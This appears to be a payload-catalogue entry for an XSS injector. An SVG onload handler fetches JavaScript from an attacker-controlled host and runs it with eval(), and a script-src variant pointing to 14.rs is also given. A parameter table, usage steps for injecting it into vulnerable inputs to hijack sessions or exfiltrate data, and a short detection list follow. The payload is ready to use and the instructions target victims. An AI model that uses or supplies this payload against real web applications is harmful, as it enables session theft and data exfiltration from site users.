---
type: code
language: HTML
verified: true
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Web
tags:
  - xss
  - payload
  - javascript-injection
validated: true
---

# SVG-Onload-Fetch-JavaScript-Injector

## Code

```html
<svg/onload='fetch("//host/a").then(r=>r.text().then(t=>eval(t)))'>
<script src=14.rs>
// you can also specify an arbitrary payload with 14.rs/#payload
e.g: 14.rs/#alert(document.domain)
```

## Description

This HTML code snippet exploits XSS vulnerabilities by injecting an SVG element with an onload attribute that fetches content from a remote URL (e.g., //host/a or 14.rs) and executes it using the fetch API followed by eval(). It allows loading external JavaScript dynamically, bypassing some filters that block direct <script> tags. The optional #payload fragment enables inline execution without a full remote file.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| host | Attacker's domain or IP for hosting the JS file | attacker.com |
| a | Path to the malicious JS file on the server | /malicious.js |
| 14.rs | Alternative URL for the remote script (placeholder for attacker's endpoint) | attacker.com/script |
| #payload | Inline JavaScript to execute directly (appended to URL) | #alert(document.domain) |

## Usage

Inject this snippet into a vulnerable input field in a web application that renders HTML/SVG without sanitization, such as a search box or user profile. Replace 'host/a' with your actual server endpoint serving the JS payload. For testing, use a simple alert payload. Trigger by having the victim load the page containing the injection. This is commonly used in reflected or stored XSS for session hijacking or data exfiltration.

## Detection

- Browser developer tools showing unexpected fetch requests to external domains or eval() calls in console.
- Content Security Policy (CSP) violations logged on the server for script-src or connect-src directives.
- Web Application Firewall (WAF) rules detecting SVG onload patterns or fetch/eval combinations in user input.
- Network monitoring for anomalous outbound requests from the web app to attacker domains.

## Related

- [[procedures/Inject-Remote-JavaScript-via-SVG-Onload-Fetch]]
